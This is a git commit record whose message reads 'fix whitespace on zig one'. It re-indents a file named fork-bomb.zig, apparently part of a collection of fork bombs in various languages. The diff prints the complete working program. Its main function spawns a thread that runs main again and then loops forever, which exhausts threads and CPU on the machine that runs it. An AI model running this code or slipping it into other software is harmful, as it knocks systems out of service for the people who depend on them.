587b34ba0993394b569900153500adb8d668ec2e
Taylor Plewe <taylor.plewe@awardco.com>
2025-04-09 11:48:42 -0600

    fix whitespace on zig one

--- fork-bomb.zig
+++ fork-bomb.zig
@@ -1,6 +1,6 @@
 const std = @import("std");
 
 pub fn main() void {
-        _ = std.Thread.spawn(.{}, main, .{}) catch {};
-            while (true) {}
+    _ = std.Thread.spawn(.{}, main, .{}) catch {};
+    while (true) {}
 }
